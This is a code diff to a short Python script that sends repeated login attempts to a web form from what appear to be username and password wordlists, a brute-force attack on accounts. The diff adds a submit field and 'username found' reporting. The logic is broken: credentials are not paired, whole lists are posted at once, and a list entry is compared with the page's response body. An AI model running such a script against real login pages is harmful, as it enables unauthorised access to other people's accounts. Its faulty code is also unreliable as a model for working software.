@@ -17,6 +17,7 @@ def login(username, password):
 	r = requests.post(url, data = {
 			"username": username,
 			"password": password,
+			"submit": "submit",
 	    })
 	return r
 
@@ -30,7 +31,14 @@ with open(word2, "r") as h:
 credentials = usernames and passwords
 
 for x in credentials:
-	response = login(usernames, passwords).text
-	print(f"""username: {x} | {response}
-password: {x} | {response} \n""")
-
+	try:
+		response = login(usernames, passwords).text
+		if x == response:
+			print(f"""username found: {x}
+password found: {x} \n""")
+		else:
+			print(f"""username: {x} is invalid
+password: {x} is invalid \n""")
+	except:
+		print("Cancelled")
+		break
